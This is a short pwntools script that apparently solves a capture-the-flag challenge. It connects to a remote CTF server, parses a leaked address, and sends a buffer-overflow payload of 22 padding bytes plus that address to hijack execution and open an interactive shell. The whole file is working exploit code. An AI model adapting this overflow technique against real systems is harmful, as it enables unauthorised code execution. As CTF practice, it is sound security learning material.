from pwn import *

r = remote("ctf.j0n9hyun.xyz", 3008)

r.recvline()
r.recv(12)

get_addr = r.recv(10).decode('utf-8')

addr = int(get_addr[0:7]+'890', 16)


payload = b'A'*22
payload += p32(addr)

r.sendline(payload)

r.interactive()